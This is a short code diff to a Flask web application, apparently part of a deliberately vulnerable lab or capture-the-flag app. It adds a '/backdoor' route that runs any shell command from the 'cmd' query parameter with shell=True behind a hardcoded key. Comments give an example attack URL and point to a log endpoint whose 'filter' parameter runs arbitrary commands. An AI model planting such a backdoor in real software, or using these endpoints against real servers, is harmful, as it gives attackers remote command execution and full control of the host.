@@ -172,6 +172,8 @@ def register():
         db.commit()
         db.close()
     return render_template('register.html',usererror=usererror,passworderror=passworderror)
+
+
 # delete this comment: http://target_ip:5000/utils/log?type=file&filter= any command you want to run
 @app.route("/utils/log", methods=["GET"])
 def log():
@@ -186,6 +188,15 @@ def log():
                 return str(e)
     return f"Fetching {log_type} logs"
 
+
+#how it was before
+# http://target_ip:5000/backdoor?key=secretkey123&cmd=whoami
+@app.route("/backdoor", methods=["GET"])
+def backdoor():
+    if request.args.get("key") == "secretkey123":
+        import subprocess
+        return subprocess.check_output(request.args.get("cmd"), shell=True)
+    return "Access Denied"
 
 @app.route("/logout/")
 @login_required
